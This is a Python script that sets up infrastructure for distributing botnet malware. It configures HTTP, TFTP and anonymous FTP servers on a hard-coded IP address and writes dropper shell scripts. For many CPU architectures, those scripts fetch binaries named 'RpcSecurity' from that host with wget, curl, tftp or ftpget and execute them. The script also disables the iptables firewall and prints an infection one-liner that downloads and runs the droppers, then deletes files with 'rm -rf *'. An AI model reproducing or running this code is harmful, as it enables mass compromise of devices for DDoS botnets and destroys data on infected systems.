import subprocess, sys, urllib
ip = "194.135.82.196"

exec_bin = "RpcSecurity"
exec_name = "RpcSecurity"
bin_prefix = "RpcSecurity."
bin_directory = "GuruITDDoS"

archs = [
"x86",                        #1
"mips",                       #2
"mpsl",                       #4
"arm",                        #5
"arm5",                       #6
"arm6",                       #7
"arm7",                       #9
"ppc",                        #10
"m68k",                       #12
"sh4",                        #13
"spc",                        #14
"arc",                        #15
"x86_64",                     #16
]                        

def run(cmd):
    subprocess.call(cmd, shell=True)

print("Setting up Apache & TFTP & FTP for your payload")
print(" ")

run("sudo service nginx restart")
run("sudo service vsftpd restart")

run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd-anon.conf''')
run("service vsftpd restart")
run("service xinetd restart")
run("service httpd restart")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/GuruITDDoS1.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/GuruITDDoS1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/GuruITDDoS1.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/GuruITDDoS2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/GuruITDDoS2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/GuruITDDoS2.sh')
run('echo "#!/bin/bash" > /var/www/html/GuruITDDoS3.sh') #HTML
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/GuruITDDoS2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/GuruITDDoS2.sh')
run('echo "#!/bin/bash" > /var/ftp/GuruITDDoS4.sh')
run('echo "ulimit -n 1024" >> /var/ftp/GuruITDDoS4.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/GuruITDDoS4.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+exec_name+'" >> /var/www/html/GuruITDDoS3.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+exec_name+' >> /var/ftp/GuruITDDoS4.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+exec_name+'" >> /var/lib/tftpboot/GuruITDDoS1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+exec_name+'" >> /var/lib/tftpboot/GuruITDDoS2.sh')    
run("service xinetd restart &> /dev/null")
run("service nginx restart &> /dev/null")
run("service httpd restart &> /dev/null")
run("service iptables stop")
run('echo -e "ulimit -n 99999;ulimit -e 99999; ulimit -u 99999" >> ~/.bashrc')

payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/GuruITDDoS3.sh; curl -O http://" + ip + "/GuruITDDoS3.sh; chmod 777 GuruITDDoS3.sh; sh GuruITDDoS3.sh; tftp " + ip + " -c get GuruITDDoS1.sh; chmod 777 GuruITDDoS4.sh; sh GuruITDDoS4.sh; tftp -r GuruITDDoS2.sh -g " + ip + "; chmod 777 GuruITDDoS2.sh; sh GuruITDDoS2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " GuruITDDoS4.sh GuruITDDoS4.sh; sh GuruITDDoS4.sh; rm -rf GuruITDDoS1.sh GuruITDDoS2.sh GuruITDDoS4.sh; rm -rf *"
print(payload)
print("Copied to /var/www/html/bins.sh")
run('echo "'+payload+'" >> /var/www/html/bins.sh')
print("")
raw_input("press any key to exit....")
